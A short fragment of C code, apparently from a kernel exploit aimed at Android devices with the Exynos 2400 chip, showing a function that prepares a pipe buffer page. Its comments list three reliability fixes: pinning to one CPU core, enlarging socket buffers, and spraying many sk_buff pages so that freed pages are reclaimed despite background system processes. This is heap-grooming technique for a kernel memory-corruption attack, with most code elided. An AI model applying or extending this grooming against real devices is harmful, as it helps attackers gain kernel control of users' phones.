...
uintptr_t prepare_pipe_buffer_page_child(void) {
 ...
 /* FIX 1: Pin to target core BEFORE any socket allocations so all
 * sk_buff pages land on the same per-CPU page list. */
 pin_to_core(CORE);
 ...
 /* FIX 2: Expand socket buffers so we can spray many sk_buff pages
 * without blocking on a full receive buffer. */
 ...
 /* FIX 3: Spray many sk_buff data pages. The original code sent once,
 * leaving only a few pages on the per-CPU free list. Background
 * Android processes (logd, surfaceflinger, binder) steal freed pages
 * aggressively on Exynos 2400. A dense spray makes reclaim reliable. */
